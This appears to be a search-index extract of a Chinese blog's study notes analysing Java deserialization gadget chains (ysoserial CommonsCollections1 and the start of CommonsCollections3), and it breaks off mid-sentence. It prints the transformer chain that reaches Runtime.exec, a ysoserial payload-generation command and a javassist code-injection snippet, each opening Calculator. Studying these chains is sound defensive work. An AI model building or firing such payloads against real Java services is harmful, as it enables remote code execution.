<p>\u5173\u4e8eObjectStreamClass\u7684\u529f\u80fd\uff0c\u5b83\u662f\u7c7b\u7684\u5e8f\u5217\u5316\u63cf\u8ff0\u5668\uff0c\u5305\u542b\u7c7b\u7684\u540d\u5b57\u548c\u5e8f\u5217\u7248\u672c\u53f7\u3002\u4f7f\u7528\u5b83\u7684lookup\u51fd\u6570\u53ef\u4ee5\u8f7d\u5165\u6216\u65b0\u5efa\u8be5\u7c7b\uff0c\u4f46\u8fd9\u91cc\u5b9e\u9645\u4e0a\u7528\u7684\u662fnewInstance\u6765\u5b9e\u4f8b\u5316\u5f53\u524d\u7684\u5e8f\u5217\u5316\u63cf\u8ff0\u5668\uff0c\u5373\u4ea7\u751f\u5f53\u524d\u63cf\u8ff0\u5668\u6307\u4ee3\u7684\u7c7b\u3002</p> <p>Serialization's descriptor for classes. It contains the name and serialVersionUID of the class. The ObjectStreamClass for a specific class loaded in this Java VM can be found/created using the lookup method.</p> <p>\u5176\u4e2d\u51fd\u6570<code>readClassDesc</code>\u5c06\u4ece\u5e8f\u5217\u5316\u6d41\u4e2d\u63d0\u53d6\u51fa\u76f8\u5173\u7684\u7c7b\u4fe1\u606f\u3002\u8fd9\u91cc\u5c31\u76f4\u63a5\u770b\u5229\u7528\u53cd\u5c04\u673a\u5236\u83b7\u53d6\u5230\u7c7b\u7684\u5730\u65b9\uff0c\u4f4d\u4e8e<code>ObjectInputStream.resolveClass</code>\uff0c\u4e0b\u56fe\u4e3a\u8c03\u7528\u94fe </p> <p><code>ObjectInputStream:resolveClass:677</code></p> <p></p> <p>\u8fd9\u91cc\u63d0\u53d6\u4e86jvm\u4e2d\u5f53\u524d\u8fd9\u4e2a\u6d41\u4e2d\u7684\u7c7b\u7684Class\u5bf9\u8c61\uff0c\u7528\u4e8e\u540e\u7eed\u7684newInstance\u3002</p> <p>\u6b64\u5904\u6574\u4e00\u4e2a\u53cd\u5c04\u5c31\u662f\u5148\u901a\u8fc7<code>Class.forName</code>\u83b7\u53d6\u5230\u5f53\u524d\u63cf\u8ff0\u5668\u6240\u6307\u4ee3\u7684\u7c7b\u7684Class\u5bf9\u8c61\uff0c\u540e\u7eed\u4f1a\u5728<code>initNonProxy</code>\u6216<code>initProxy</code>\u51fd\u6570\u4e2d\u590d\u5236\u8be5Class\u5bf9\u8c61\u7684\u76f8\u5173\u4fe1\u606f(\u5305\u62ec\u76f8\u5173\u51fd\u6570)\uff0c\u6700\u540e\u57282044\u884c\u5904<code>ObjectStreamClass.newInstance</code>\u5b9e\u4f8b\u5316\u8be5\u5bf9\u8c61\u3002</p> <p>\u5728\u5b9e\u4f8b\u5316\u540e\u4f1a\u7528<code>ObjectInputStream.readSerialData</code>\u51fd\u6570\u5c06\u5e8f\u5217\u5316\u6d41\u4e2d\u7684\u76f8\u5173\u6570\u636e\u586b\u5145\u8fdb\u5b9e\u4f8b\u5316\u540e\u7684\u5bf9\u8c61\u4e2d\u6216\u8c03\u7528\u5f53\u524d\u7c7b\u63cf\u8ff0\u5668\u7684readObject\u51fd\u6570\u3002</p> <p><code>ObjectInputStream:readSerialData:2149</code></p> <p></p> <p>\u8fd9\u91cc\u4f1a\u6839\u636e\u5f53\u524d\u7684\u7c7b\u63cf\u8ff0\u5668\u662f\u5426\u5b58\u5728readObject\u51fd\u6570\u6765\u81ea\u52a8\u8c03\u7528\u8be5\u51fd\u6570\uff0c\u6216\u8005\u662f\u586b\u5145\u5e8f\u5217\u6d41\u4e2d\u7684field\u6570\u636e\u3002\u8fd9\u91cc\u7684readObject\u7684\u8c03\u7528\u5e38\u4e3a\u5229\u7528\u94fe\u7684\u4e00\u90e8\u5206\uff0c\u4f8b\u5982CommonsCollections1\u4e2d\u7684<code>AnnotationInvocationHandler</code>\uff0c\u540e\u6587\u5c06\u5206\u6790\u8be5\u51fd\u6570\u3002</p> <p>\u6ce8\u610f\uff1a\u7531\u4e8e\u6211\u4eec\u7528\u7684\u662fSerializable\u63a5\u53e3\uff0c\u6240\u4ee5\u4e0a\u8ff0\u5e76\u672a\u63d0\u53ca\u4f7f\u7528Externalizable\u63a5\u53e3\u7684\u60c5\u51b5\u3002</p> <p>\u5230\u6b64\u4e3a\u6b62\uff0c\u6700\u540e\u8fd4\u56de\u7684\u5bf9\u8c61\u5c31\u662f\u6700\u7ec8\u6211\u4eec\u5f97\u5230\u7684\u5e8f\u5217\u5316\u524d\u7684\u5bf9\u8c61\u3002</p>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections3-1-20191024/#_1","title":"\u5c0f\u7ed3","text":"<p>\u8fd9\u91cc\u5f15\u7528\u6d45\u8c08Java\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u4fee\u590d\u65b9\u6848</p> <p>Java\u7a0b\u5e8f\u4e2d\u7c7bObjectInputStream\u7684readObject\u65b9\u6cd5\u88ab\u7528\u6765\u5c06\u6570\u636e\u6d41\u53cd\u5e8f\u5217\u5316\u4e3a\u5bf9\u8c61\uff0c\u5982\u679c\u6d41\u4e2d\u7684\u5bf9\u8c61\u662fclass\uff0c\u5219\u5b83\u7684ObjectStreamClass\u63cf\u8ff0\u7b26\u4f1a\u88ab\u8bfb\u53d6\uff0c\u5e76\u8fd4\u56de\u76f8\u5e94\u7684class\u5bf9\u8c61\uff0cObjectStreamClass\u5305\u542b\u4e86\u7c7b\u7684\u540d\u79f0\u53caserialVersionUID\u3002</p> <p>\u5982\u679c\u7c7b\u63cf\u8ff0\u7b26\u662f\u52a8\u6001\u4ee3\u7406\u7c7b\uff0c\u5219\u8c03\u7528resolveProxyClass\u65b9\u6cd5\u6765\u83b7\u53d6\u672c\u5730\u7c7b\u3002\u5982\u679c\u4e0d\u662f\u52a8\u6001\u4ee3\u7406\u7c7b\u5219\u8c03\u7528resolveClass\u65b9\u6cd5\u6765\u83b7\u53d6\u672c\u5730\u7c7b\u3002\u5982\u679c\u65e0\u6cd5\u89e3\u6790\u8be5\u7c7b\uff0c\u5219\u629b\u51faClassNotFoundException\u5f02\u5e38\u3002</p> <p>\u5982\u679c\u53cd\u5e8f\u5217\u5316\u5bf9\u8c61\u4e0d\u662fString\u3001array\u3001enum\u7c7b\u578b\uff0cObjectStreamClass\u5305\u542b\u7684\u7c7b\u4f1a\u5728\u672c\u5730\u88ab\u68c0\u7d22\uff0c\u5982\u679c\u8fd9\u4e2a\u672c\u5730\u7c7b\u6ca1\u6709\u5b9e\u73b0java.io.Serializable\u6216\u8005externalizable\u63a5\u53e3\uff0c\u5219\u629b\u51faInvalidClassException\u5f02\u5e38\u3002\u56e0\u4e3a\u53ea\u6709\u5b9e\u73b0\u4e86Serializable\u548cExternalizable\u63a5\u53e3\u7684\u7c7b\u7684\u5bf9\u8c61\u624d\u80fd\u88ab\u5e8f\u5217\u5316\u3002</p> <p>\u524d\u9762\u5206\u6790\u4e2d\u63d0\u5230\u6700\u540e\u4f1a\u8c03\u7528<code>resolveClass</code>\u83b7\u53d6\u7c7b\u7684Class\u5bf9\u8c61\uff0c\u8fd9\u662f\u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b\u4e2d\u4e00\u4e2a\u91cd\u8981\u7684\u5730\u65b9\uff0c\u4e5f\u662f\u5fc5\u7ecf\u4e4b\u8def\uff0c\u6240\u4ee5\u6709\u7814\u7a76\u4eba\u5458\u63d0\u51fa\u901a\u8fc7\u91cd\u8f7d<code>ObjectInputStream</code>\u7684<code>resolveClass</code>\u6765\u9650\u5236\u53ef\u4ee5\u88ab\u53cd\u5e8f\u5217\u5316\u7684\u7c7b</p>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections3-1-20191024/#0x03","title":"0x03 \u5229\u7528\u94fe\u53d1\u6398","text":"<p>\u540cPHP\u7684\u53cd\u5e8f\u5217\u5316\u4e00\u6837\uff0c\u5355\u5355\u53d1\u73b0\u53cd\u5e8f\u5217\u5316\u7684\u89e6\u53d1\u70b9\u5e76\u4e0d\u80fd\u9020\u6210\u4e25\u91cd\u7684\u5f71\u54cd\u3002\u5f80\u5f80\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u5371\u5bb3\u7a0b\u5ea6\u53d6\u51b3\u4e8e\u540e\u7eed\u7684\u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe\u6240\u80fd\u8fbe\u5230\u7684\u5371\u9669\u7a0b\u5ea6\u3002\u5728java\u4e2dysoserial\u5de5\u5177\u7ed9\u6211\u4eec\u63d0\u4f9b\u4e86\u8bb8\u591a\u5e38\u89c1\u7684\u5e93\u5b58\u5728\u7684\u5229\u7528\u94fe\uff0c\u8fd9\u4e00\u8282\u5c06\u9010\u4e00\u5206\u6790\u8fd9\u4e9b\u5229\u7528\u94fe\u3002</p>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections3-1-20191024/#1-commonscollections1jdk7","title":"1. CommonsCollections1(jdk&lt;=7)","text":"<p>\u53c2\u8003\u94fe\u63a5</p> <p>Apache Commons Collections\u662f\u4e00\u4e2a\u6269\u5c55\u4e86Java\u6807\u51c6\u5e93\u91cc\u7684Collection\u7ed3\u6784\u7684\u7b2c\u4e09\u65b9\u57fa\u7840\u5e93\uff0c\u5b83\u63d0\u4f9b\u4e86\u5f88\u591a\u5f3a\u6709\u529b\u7684\u6570\u636e\u7ed3\u6784\u7c7b\u578b\u5e76\u4e14\u5b9e\u73b0\u4e86\u5404\u79cd\u96c6\u5408\u5de5\u5177\u7c7b\u3002\u4f5c\u4e3aApache\u5f00\u6e90\u9879\u76ee\u7684\u91cd\u8981\u7ec4\u4ef6\uff0cCommons Collections\u88ab\u5e7f\u6cdb\u5e94\u7528\u4e8e\u5404\u79cdJava\u5e94\u7528\u7684\u5f00\u53d1\u3002</p> <p>CommonsCollection1\u7684\u5206\u6790\u6587\u7ae0\u6bd4\u8f83\u591a\uff0c\u521a\u5f00\u59cb\u5148\u4ece\u8fd9\u4e2agadget\u5f00\u59cb\u5206\u6790\u3002\u8fd9\u91cc\u6211\u7528\u7684\u5206\u6790\u65b9\u6cd5\u662f\u5148\u5199\u4e00\u4e2a\u89e6\u53d1\u70b9\uff0c\u7136\u540e\u7528ysoserial\u751f\u6210payload\u6765\u8c03\u8bd5\u3002</p> <p>CommonsCollections1 payload\u9488\u5bf9\u7684commons-collections 3.1\u7248\u672c\uff0c\u5148\u5f15\u5165\u5e93</p> <pre><code>&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;\n&lt;dependency&gt;\n  &lt;groupId&gt;commons-collections&lt;/groupId&gt;\n  &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;\n  &lt;version&gt;3.1&lt;/version&gt;\n&lt;/dependency&gt;\n</code></pre> <p>\u5728ysoserial\u7684exp\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u4e00\u6574\u4e2a\u8c03\u7528\u7684\u94fe</p> <p></p> <p>\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5229\u7528\u94fe\u7684\u6700\u540e\u8c03\u7528\u4e86<code>Runtime.getRuntime().exec()</code>\uff0c\u8fd9\u610f\u5473\u7740\u6211\u4eec\u9700\u8981\u5728\u524d\u4e00\u6b65\u7684\u94fe\u4e0a\u53ef\u4ee5\u8fbe\u5230\u8c03\u7528\u4efb\u610f\u7c7b\u548c\u65b9\u6cd5\u7684\u51fd\u6570\u3002</p> <p>CommonsCollections1\u7528\u7684\u5c31\u662f3.1\u7248\u672c\u4e0b\u7684<code>InvokerTransformer.transform()</code></p> <pre><code>public Object transform(Object input) {\n    if (input == null) {\n        return null;\n    }\n    try {\n        Class cls = input.getClass();\n        Method method = cls.getMethod(iMethodName, iParamTypes);\n        return method.invoke(input, iArgs);\n\n    } catch (NoSuchMethodException ex) {\n        throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' does not exist\");\n    } catch (IllegalAccessException ex) {\n        throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' cannot be accessed\");\n    } catch (InvocationTargetException ex) {\n        throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' threw an exception\", ex);\n    }\n}\n</code></pre> <p>\u6b64\u5904\u7528\u7684\u5c31\u662fJava\u7684\u53cd\u5c04\u673a\u5236\uff0c\u52a8\u6001\u8c03\u7528\u7c7b\u548c\u65b9\u6cd5\u3002\u4e3a\u4e86\u80fd\u52a8\u6001\u8c03\u7528\u4efb\u610f\u7c7b\u51fd\u6570\uff0c\u6211\u4eec\u8fd8\u5f97\u63a7\u5236<code>iMethodName\u3001iParamTypes\u3001iArgs</code>\uff0c\u8be5\u7c7b\u5c5e\u6027\u5b9a\u4e49\u5728InvokerTransformer\u7684\u6784\u9020\u51fd\u6570\u4e0a</p> <pre><code>public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {\n    super();\n    iMethodName = methodName;\n    iParamTypes = paramTypes;\n    iArgs = args;\n}\n</code></pre> <p>\u90a3\u4e48\u63a5\u4e0b\u6765\u5c31\u8ddfphp\u7c7b\u4f3c\u4e86\uff0c\u627e\u4e00\u4e2a\u7c7b\uff0c\u5b83\u7684\u7c7b\u5c5e\u6027\u53ef\u63a7\uff0c\u4e14\u8be5\u7c7b\u5c5e\u6027\u540e\u7eed\u8fd8\u4f1a\u8c03\u7528transform\u51fd\u6570\u3002\u7531\u4e8e\u5b8c\u6210<code>Runtime.getRuntime().exec()</code>\u52a8\u4f5c\u9700\u8981\u591a\u6b21\u8c03\u7528transform\u51fd\u6570\uff08\u5148\u8c03\u7528Runtime.getRuntime\u518d\u8c03\u7528Runtime.exec\uff09\uff0c\u6240\u4ee5\u8fd8\u5f97\u627e\u4e00\u4e2a\u80fd\u591a\u6b21\u8c03\u7528transform\u7684\u5730\u65b9\uff0c\u6765\u770b\u4e00\u4e0b<code>ChainedTransformer</code></p> <pre><code>private final Transformer[] iTransformers;// \u586b\u5145\u6784\u9020\u540e\u7684\u5b9e\u4f8b\n\npublic Object transform(Object object) {\n    for (int i = 0; i &lt; iTransformers.length; i++) {\n        object = iTransformers[i].transform(object);// \u8c03\u7528\u94fe\uff0c\n    }\n    return object;\n}\n</code></pre> <p>\u5728<code>Transformer</code>\u7684\u5b50\u7c7b\u4e0b\u9762\u627e\u5230\u80fd\u751f\u6210\u547d\u4ee4\u6267\u884c\u7684\u5229\u7528\u94fe\u5373\u53ef\uff0c\u6765\u5206\u6790\u4e00\u4e0bCommonCollections1\u7684\u6784\u9020</p> <pre><code>// real chain for after setup\nfinal Transformer[] transformers = new Transformer[] {\n      new ConstantTransformer(Runtime.class),// \u83b7\u53d6Runtime\u5bf9\u8c61\n      new InvokerTransformer(\"getMethod\", new Class[] {//\u83b7\u53d6Runtime.getRuntime()\u65b9\u6cd5\u5bf9\u8c61\n         String.class, Class[].class }, new Object[] {\n         \"getRuntime\", new Class[0] }),\n      new InvokerTransformer(\"invoke\", new Class[] {// \u53cd\u5c04\u8c03\u7528invoke,\u518dinvoke\u6267\u884cRuntime.getRuntime()\u65b9\u6cd5\uff0c\u83b7\u53d6Runtime\u5b9e\u4f8b\u5316\u5bf9\u8c61\n         Object.class, Object[].class }, new Object[] {\n         null, new Object[0] }),\n      new InvokerTransformer(\"exec\",// \u53cd\u5c04\u8c03\u7528exec\u65b9\u6cd5\uff0c\u6267\u884c\u6700\u7ec8\u7684\u547d\u4ee4\n         new Class[] { String.class }, execArgs),\n      new ConstantTransformer(1) };\n</code></pre> <p>\u94fe\u7684\u7b2c\u4e00\u4e2a\u7ed3\u70b9\u9009\u7528\u7684\u662f<code>ConstantTransformer</code>\uff0c\u5176transformer\u76f4\u63a5\u8fd4\u56de\u6784\u9020\u65f6\u7684\u5bf9\u8c61</p> <pre><code>private final Object iConstant;// \u6b64\u65f6iConstant\u7f6e\u4e3aRuntime.class\npublic ConstantTransformer(Object constantToReturn) {\n    super();\n    iConstant = constantToReturn;\n}\n\npublic Object transform(Object input) {// \u76f4\u63a5\u8fd4\u56deRuntime.class\n  return iConstant;\n}\n</code></pre> <p>\u6700\u7ec8\u7684\u8c03\u7528\uff0c\u7c7b\u4f3c</p> <pre><code>Object obj = Runtime.class;\nClass cls = obj.getClass();\nMethod method;\nmethod = cls.getMethod(\"getMethod\",new Class[] {String.class, Class[].class });\nobj = method.invoke(obj, new Object[] {\"getRuntime\", new Class[0] });\ncls = obj.getClass();\nmethod = cls.getMethod(\"invoke\",new Class[] {Object.class, Object[].class });\nobj = method.invoke(obj, new Object[] {null, new Object[0] });\ncls = obj.getClass();\nmethod = cls.getMethod(\"exec\",new Class[] { String.class });\nmethod.invoke(obj, new String[] { \"open /System/Applications/Calculator.app\" });\n</code></pre> <p>\u63a5\u4e0b\u6765\u7684\u95ee\u9898\u662f\u5982\u4f55\u89e6\u53d1<code>ChainedTransformer</code>\uff1f\u641c\u7d22\u4e00\u4e0b\u8c03\u7528transform\u7684\u4f4d\u7f6e\uff0c\u6392\u9664\u6389xxxTransformer\u7c7b\uff0c\u6700\u6709\u53ef\u80fd\u88ab\u5229\u7528\u7684\u5c31\u662f<code>LazyMap.get</code>\u3001<code>TransformedMap.checkSetValue</code>\uff0c\u5176\u4e2dcheckSetValue\u4f1a\u5728setValue\u51fd\u6570\u88ab\u8c03\u7528\u7684\u65f6\u5019\u8c03\u7528\u3002</p> <p>\u63a5\u4e0b\u6765\u5c31\u662f\u627e\u80fd\u89e6\u53d1\u4e0a\u9762\u4e24\u4e2a\u5229\u7528\u65b9\u5f0f\u7684\u65b9\u6cd5\u3002</p> <p>\u540c\u6837\u7684\uff0c\u524d\u9762\u57fa\u7840\u77e5\u8bc6\u63d0\u5230\uff0c\u5982\u679c\u4e00\u4e2a\u5bf9\u8c61\u7684readObject\u51fd\u6570\u88ab\u91cd\u8f7d\u4e86\uff0c\u4f1a\u4f18\u5148\u8c03\u7528\u91cd\u8f7d\u540e\u7684readObject\u51fd\u6570\u3002</p> <p>\u6211\u4eec\u6700\u597d\u80fd\u5728\u88ab\u91cd\u8f7d\u7684readObject\u51fd\u6570\u4e2d\u53d1\u73b0\u76f8\u5173\u53ef\u63a7Map\u6570\u636e\u7684\u64cd\u4f5c(get\u548csetValue)\u3002</p> <p>\u800cexp\u4e2d<code>sun.reflect.annotation.AnnotationInvocationHandler</code>\u975e\u5e38\u7b26\u5408\u4e0a\u8ff0\u7684\u63cf\u8ff0\u3002</p> <p>\u6765\u770b\u4e00\u4e0b\u8fd9\u4e2a\u7c7b\u7684readObject\u5b9e\u73b0</p> <pre><code>private void readObject(java.io.ObjectInputStream s)\n  throws java.io.IOException, ClassNotFoundException {\n  s.defaultReadObject();\n\n  // Check to make sure that types have not evolved incompatibly\n\n  AnnotationType annotationType = null;\n  try {\n    annotationType = AnnotationType.getInstance(type);\n  } catch(IllegalArgumentException e) {\n    // Class is no longer an annotation type; time to punch out\n    throw new java.io.InvalidObjectException(\"Non-annotation type in annotation serial stream\");\n  }\n\n  Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();\n\n  // If there are annotation members without values, that\n  // situation is handled by the invoke method.\n  for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) {\n    String name = memberValue.getKey();\n    Class&lt;?&gt; memberType = memberTypes.get(name);\n    if (memberType != null) {  // i.e. member still exists\n      Object value = memberValue.getValue();\n      if (!(memberType.isInstance(value) ||\n            value instanceof ExceptionProxy)) {\n        memberValue.setValue(\n          new AnnotationTypeMismatchExceptionProxy(\n            value.getClass() + \"[\" + value + \"]\").setMember(\n            annotationType.members().get(name)));\n      }\n    }\n  }\n}\n</code></pre> <p>\u5728\u7b2c26\u884c\u5904\uff0c\u8c03\u7528\u4e86memberValue.setValue\uff0c\u8fd9\u91cc\u7684memberValue\u6211\u4eec\u53ef\u4ee5\u5c06\u5176\u7f6e\u4e3a\u6784\u9020\u597d\u7684TransformedMap\u5b9e\u4f8b\u3002</p> <p>\u5728\u8fd9\u4e2aTransformedMap\u5b9e\u4f8b\u4e0a\uff0cvalueTransformer\u5c5e\u6027\u88ab\u7f6e\u4e3a\u524d\u6587\u7684ChainedTransformer\u3002\u8fd9\u6837\u8fd9\u4e2a\u94fe\u5c31\u4e32\u8d77\u6765\u4e86\uff0c\u603b\u7ed3\u4e00\u4e0b</p> <pre><code>sun.reflect.annotation.AnnotationInvocationHandler.readObject()\n  -&gt; memberValue.setValue() =&gt; TransformedMap.setValue() =&gt; TransformedMap.checkSetValue()\n  -&gt; valueTransformer.transform() =&gt; ChainedTransformer.transform()\n  -&gt; \u524d\u6587\u6784\u9020\u7684Runtime.getRuntime().exec()\n</code></pre> <p>\u7b2c\u4e8c\u79cd\uff0c\u5229\u7528LazyMap.get()</p> <p>CommonsCollections1\u4e2d\u5229\u7528\u4e86AnnotationInvocationHandler.invoke\u51fd\u6570</p> <pre><code>public Object invoke(Object proxy, Method method, Object[] args) {\n    String member = method.getName();\n    // ...\n\n    switch(member) {\n    case \"toString\":\n        return toStringImpl();\n    case \"hashCode\":\n        return hashCodeImpl();\n    case \"annotationType\":\n        return type;\n    }\n\n    // Handle annotation member accessors\n    Object result = memberValues.get(member);\n\n    // ...\n}\n</code></pre> <p>\u7b2c15\u884c\u8c03\u7528\u4e86memberValues.get\u51fd\u6570\uff0c\u8fd9\u91cc\u5982\u679cmemberValues\u8bbe\u7f6e\u4e3a\u6784\u9020\u597d\u7684LazyMap\u5b9e\u4f8b\uff0c\u5c06\u89e6\u53d1\u8be5\u5229\u7528\u94fe\u7684\u6267\u884c\u3002</p> <p>\u90a3\u4e48\u600e\u4e48\u6765\u8c03\u7528invoke\u51fd\u6570\u5462\uff1f\u8fd9\u91cc\u7528\u5230\u4e86Proxy\u52a8\u6001\u4ee3\u7406\u673a\u5236\u3002\u5728\u8be5\u673a\u5236\u4e0b\u88ab\u4ee3\u7406\u7684\u5b9e\u4f8b\u4e0d\u7ba1\u8c03\u7528\u4ec0\u4e48\u7c7b\u65b9\u6cd5\uff0c\u90fd\u4f1a\u5148\u8c03\u7528invoke\u51fd\u6570\u3002</p> <p>\u90a3\u4e48\u6211\u4eec\u5229\u7528Proxy\u52a8\u6001\u4ee3\u7406AnnotationInvocationHandler\uff0c\u5e76\u5c06memberValues\u8bbe\u7f6e\u4e3aLazyMap\u3002\u5728AnnotationInvocationHandler.readObject\u51fd\u6570\u91cc\uff0c\u7b2c19\u884c\u8c03\u7528\u4e86memberValues.entrySet\u51fd\u6570\u3002\u5728\u52a8\u6001\u4ee3\u7406\u4e0b\u4f1a\u5148\u8c03\u7528invoke\u51fd\u6570\uff0c\u4e14\u6b64\u65f6\u7684\u51fd\u6570\u540dentrySet\u4e0d\u5728toString\u3001hashCode\u3001annotationType\u91cc\uff0c\u90a3\u4e48\u4f1a\u6700\u7ec8\u8d70\u5230\u7b2c15\u884c\u7684\u4f4d\u7f6e\u3002\u603b\u7ed3\u4e00\u4e0b\u8fd9\u4e2a\u8c03\u7528\u94fe</p> <pre><code>sun.reflect.annotation.AnnotationInvocationHandler.readObject()\n  -&gt; memberValues.entrySet()\n  -&gt; AnnotationInvocationHandler.invoke()\n  -&gt; memberValues.get() =&gt; LazyMap.get()\n  -&gt; factory.transform() =&gt; ChainedTransformer.transform()\n  -&gt; \u524d\u6587\u6784\u9020\u7684Runtime.getRuntime().exec()\n</code></pre> <p>\u8fd9\u4e5f\u662fysoserial\u7684CommonsCollections1\u7684\u8c03\u7528\u94fe\u3002</p> <p>\u540e\u7eed\u7684\u5229\u7528\u94fe\u5206\u6790\u653e\u5728\u4e0b\u4e00\u7bc7\u6587\u7ae0\u91cc\u3002</p>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections3-1-20191024/#0x04","title":"0x04 \u603b\u7ed3","text":"<p>\u7ecf\u8fc7\u5bf9ysoserial\u5de5\u5177\u751f\u6210\u7684\u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe\u7684\u8c03\u8bd5\uff0c\u719f\u6089\u4e86Java\u7684\u53cd\u5e8f\u5217\u5316\u7684\u4e00\u4e2a\u6d41\u7a0b\u3002\u4f46\u5bf9\u4e8eexp\u7684\u4e66\u5199\u4ecd\u7136\u6709\u5f85\u63d0\u9ad8\u3002</p> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cCommonCollections1\u548c3\u7528\u7684override.class\u4f5c\u4e3aAnnotation\u5728jdk8\u4e0a\u662f\u4e0d\u9002\u7528\u7684\uff0c\u8981\u8c03\u8bd5\u8fd9\u4e24\u4e2apayload\u9700\u8981\u7528jdk7\uff0c\u53c2\u8003</p> <p>\u9664\u6b64\u4e4b\u5916\uff0c\u5728\u8c03\u8bd5\u8fc7\u7a0b\u4e2d\uff0c\u4f53\u4f1a\u5230\u4e86javassist\u5e93\u7684\u5f3a\u5927\uff0c\u4fee\u6539jar\u5305\u91cc\u7684class\u6587\u4ef6\u975e\u5e38\u8212\u670d\uff01</p> <p>Proxy\u7684\u52a8\u6001\u4ee3\u7406\u673a\u5236\uff0cJava\u7684\u53cd\u5c04\u673a\u5236\u76f8\u4fe1\u4f1a\u662f\u540e\u7eed\u5b66\u4e60\u7684\u4e00\u4e2a\u91cd\u70b9\uff0c\u7ee7\u7eed\ud83d\udcaa\uff01</p>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections3-3-20191028/","title":"Java\u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe\u6316\u6398\u4e4bCommonsCollections3","text":"","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections3-3-20191028/#0x00","title":"0x00 \u524d\u8a00","text":"<p>\u524d\u9762\u5206\u6790\u4e86ysoserial\u7684CommonsCollections1\uff0c\u719f\u6089\u4e86\u4e00\u70b9Java\u53cd\u5e8f\u5217\u5316\u3002\u672c\u6587\u5c06\u7ee7\u7eed\u5206\u6790ysoserial\u7684\u5229\u7528\uff0c\u4eca\u5929\u7684\u4e3b\u89d2\u662fCommonsCollections3.</p>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections3-3-20191028/#0x01","title":"0x01 \u73af\u5883\u51c6\u5907","text":"<p>\u9996\u5148\u7531\u4e8eoverride\u7684\u539f\u56e0\uff0c\u73af\u5883\u4f7f\u7528\u7684\u662fjdk7u80\u3002\u5229\u7528ysoserial\u751f\u6210payload\uff0c\u5e76\u8f7d\u5165\u8c03\u8bd5\u3002</p> <pre><code>java -jar ysoserial-master-30099844c6-1.jar CommonsCollections3 \"open /System/Applications/Calculator.app\" &gt; commonscollections3.ser\n</code></pre>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections3-3-20191028/#0x02","title":"0x02 \u57fa\u7840\u77e5\u8bc6","text":"<p>\u5728\u5206\u6790\u5f00\u59cb\u524d\uff0c\u5148\u8865\u5145\u4e00\u4e0b\u57fa\u7840\u77e5\u8bc6</p> <pre><code>public class StaticBlockTest {\n}\n</code></pre> <pre><code>public class Cracker {\n\n    public static byte[] generate(){\n        try {\n            String code = \"{java.lang.Runtime.getRuntime().exec(\\\"open /System/Applications/Calculator.app\\\");}\";\n            ClassPool pool = ClassPool.getDefault();\n            CtClass clazz = pool.get(StaticBlockTest.class.getName());\n            clazz.setName(\"demo\");\n            clazz.makeClassInitializer().insertAfter(code);\n            return clazz.toBytecode();\n        // ...\n    }\n    public static void main(String[] args) {\n        byte[] clazz = generate();\n        DefiningClassLoader loader = new DefiningClassLoader();\n        Class cls = loader.defineClass(\"demo\",clazz);// \u4ece\u5b57\u8282\u6570\u7ec4\u4e2d\u6062\u590d\u7c7b\n        try {\n            cls.newInstance(); // \u5b9e\u4f8b\u5316\u8be5\u7c7b\u65f6\u4f1a\u81ea\u52a8\u8c03\u7528\u9759\u6001\u5757\u5185\u7684\u4ee3\u7801\n        } \n        // ...\n    }\n}\n</code></pre> <p>\u901a\u8fc7\u4e0a\u9762\u8fd9\u4e2a\u4f8b\u5b50\uff0c\u6211\u4eec\u53ef\u4ee5\u83b7\u5f97\u7684\u77e5\u8bc6\u70b9\u4e3b\u8981\u4e3a\u4e24\u70b9\uff1a</p> <p>\u200b       a. defineClass\u53ef\u4ee5\u4ecebyte\u6570\u7ec4\u4e2d\u6062\u590d\u4e00\u4e2aClass</p> <p>\u200b       b. static initializer\u5728\u7c7b\u8f7d\u5165\u65f6\u5c06\u81ea\u52a8\u6267\u884c\uff08\u9759\u6001\u5757\u5185\u7684\u4ee3\u7801\uff09</p> <p>Java\u4e2d\u52a8\u6001\u8c03\u7528\u7684\u53e6\u4e00\u79cd\u65b9\u5f0f\u662f<code>defineClass</code></p> <p></p> <p>Java\u63d0\u4f9b\u4e86ClassLoader\u4ecebytes\u6570\u7ec4\u4e2d\u8fd8\u539fClass\u7684\u65b9\u6cd5\uff0cdefineClass\u51fd\u6570\u5c31\u662f\u5b8c\u6210\u8fd9\u4e00\u8fc7\u7a0b\u7684\u51fd\u6570\u3002</p> <p>\u7406\u8bba\u4e0a\uff0c\u5982\u679c\u4ee3\u7801\u4e2d\u4f7f\u7528\u4e86\u8fd9\u79cd\u65b9\u5f0f\uff0c\u4e14byte\u6570\u636e\u7684\u5185\u5bb9\u53ef\u63a7\uff0c\u6211\u4eec\u53ef\u4ee5\u6267\u884c\u4efb\u610fJava\u4ee3\u7801\u3002\u4e3a\u4ec0\u4e48\u5462\uff1f</p> <p>\u8fd9\u91cc\u5c31\u7528\u5230\u4e86Java\u7c7b\u7684\u53e6\u4e00\u4e2a\u7279\u6027\uff0cstatic 